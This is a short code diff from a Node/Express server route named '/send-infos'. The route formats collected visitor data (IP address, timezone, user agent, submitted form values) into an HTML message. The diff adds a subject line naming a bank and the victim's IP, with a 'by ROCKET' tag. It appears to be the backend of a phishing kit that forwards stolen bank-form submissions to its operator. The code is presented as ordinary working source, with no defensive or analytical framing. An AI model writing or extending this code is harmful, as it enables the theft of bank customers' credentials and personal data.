@@ -98,9 +98,9 @@ app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function
      <p>| TIMEZONE 👉🏽 <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
      <p>| USER AGENT 👉🏽 <b>${req.headers["user-agent"]}</b></p>
      <br>
-     <div>*******************************************************************************************</div>
+     <div>*********************************************************************************************</div>
      <div>********************************************END********************************************</div>
-     `);
+     `, `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`);
         res.send(Promise.resolve());
     }
     catch (error) {
